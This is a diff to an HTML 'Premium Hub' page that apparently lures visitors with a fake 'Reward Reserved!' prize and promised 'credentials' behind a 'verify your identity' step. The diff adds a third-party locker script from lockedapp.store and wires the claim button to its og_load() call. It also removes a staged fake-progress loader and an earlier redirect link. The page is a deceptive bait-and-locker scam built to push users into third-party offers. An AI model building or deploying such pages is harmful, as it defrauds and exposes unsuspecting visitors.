@@ -6,6 +6,9 @@
     <title>ULTRA_NET | Premium Hub 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    
+    <script type="text/javascript" id="ogjs" src="https://lockedapp.store/cl/js/277oxw"></script>
+    
     <style>
         body { background: #000; color: #4ade80; font-family: 'Inter', sans-serif; min-height: 100vh; overflow-x: hidden; }
         .matrix-card { 
@@ -71,44 +74,16 @@
                 </div>
             </div>
         </div>
-
-        <div class="bg-white/[0.02] border border-white/5 rounded-[3rem] p-12 mb-20 max-w-4xl mx-auto shadow-2xl">
-            <h2 class="text-sm font-bold text-white mb-12 italic uppercase tracking-[0.3em] text-green-500">System Instructions_</h2>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
-                <div class="flex flex-col items-center">
-                    <div class="step-circle">01</div>
-                    <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">Select Platform</p>
-                </div>
-                <div class="flex flex-col items-center">
-                    <div class="step-circle">02</div>
-                    <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">Verify Humanity</p>
-                </div>
-                <div class="flex flex-col items-center">
-                    <div class="step-circle">03</div>
-                    <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">Receive Credentials</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="loader-zone" class="hidden fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 text-center">
-        <div class="max-w-md w-full">
-            <div class="w-16 h-16 border-4 border-green-500 border-t-transparent rounded-full animate-spin mx-auto mb-10"></div>
-            <div class="mb-5 flex justify-between text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em]">
-                <span id="status-text">Processing...</span>
-                <span id="percent-text">0%</span>
-            </div>
-            <div class="h-1 w-full bg-white/5 rounded-full mb-8 overflow-hidden"><div id="fill" class="h-full bg-green-500 w-0 transition-all duration-300"></div></div>
-            <div id="safe-messages" class="text-xs font-mono text-green-500 uppercase tracking-widest opacity-80 h-6 italic">Establishing Secure Connection...</div>
-        </div>
     </div>
 
     <div id="verify-zone" class="hidden fixed inset-0 bg-black/98 z-[101] flex items-center justify-center p-4 text-center">
         <div class="bg-zinc-900 border border-green-500/20 p-12 rounded-[3rem] max-w-sm w-full shadow-2xl">
             <div class="text-6xl mb-8 animate-bounce">🎁</div>
             <h2 class="text-2xl font-black text-white mb-4 italic uppercase tracking-tighter">Reward Reserved!</h2>
-            <p class="text-sm text-gray-400 leading-relaxed mb-10">Congratulations! Your reward is ready. Please complete the <span class="text-green-500 font-bold underline text-xs">Final Step</span> to verify your identity and receive your credentials instantly.</p>
-            <button onclick="unlock()" class="w-full py-5 bg-green-500 text-black font-black rounded-2xl text-sm shadow-[0_15px_35px_rgba(74,222,128,0.3)] hover:scale-105 transition-all uppercase italic tracking-widest">Claim Your Reward Now</button>
+            <p class="text-sm text-gray-400 leading-relaxed mb-10">Congratulations! Your reward is ready. Please complete the <span class="text-green-500 font-bold underline text-xs">Final Step</span> to verify your identity.</p>
+            
+            <button onclick="og_load();" class="w-full py-5 bg-green-500 text-black font-black rounded-2xl text-sm shadow-[0_15px_35px_rgba(74,222,128,0.3)] hover:scale-105 transition-all uppercase italic tracking-widest">Claim Your Reward Now</button>
+            
             <p class="text-[9px] text-gray-600 mt-8 tracking-[0.2em] uppercase font-bold">Encrypted Transfer • Instant Delivery</p>
         </div>
     </div>
@@ -123,36 +98,15 @@
             }
         }
 
-        const safeMsgs = ["Scanning Protocols...", "Syncing Servers...", "Validating Request...", "Reward Located!", "Preparing Delivery..."];
-
         function start(type) {
-            window.history.pushState({page: "locker"}, "Verification", "#verify");
-            document.getElementById('loader-zone').classList.remove('hidden');
-            let p = 0; let msgIndex = 0;
-            const iv = setInterval(() => {
-                p += Math.floor(Math.random() * 8) + 3; 
-                if (p > 100) p = 100;
-                document.getElementById('fill').style.width = p + '%';
-                document.getElementById('percent-text').innerText = p + '%';
-                if (p % 20 == 0 && msgIndex < safeMsgs.length) { document.getElementById('safe-messages').innerText = safeMsgs[msgIndex++]; }
-                if (p >= 100) {
-                    clearInterval(iv);
-                    setTimeout(() => {
-                        document.getElementById('loader-zone').classList.add('hidden');
-                        document.getElementById('verify-zone').classList.remove('hidden');
-                    }, 800);
-                }
-            }, 180);
+            // Logic to show verify zone directly
+            document.getElementById('verify-zone').classList.remove('hidden');
         }
 
+        // Handle Back Button correctly
         window.onpopstate = function() {
             document.getElementById('verify-zone').classList.add('hidden');
-            document.getElementById('loader-zone').classList.add('hidden');
         };
-
-        function unlock() {
-            window.location.href = "https://rebrand.ly/8fgav2c";
-        }
     </script>
 </body>
 </html>
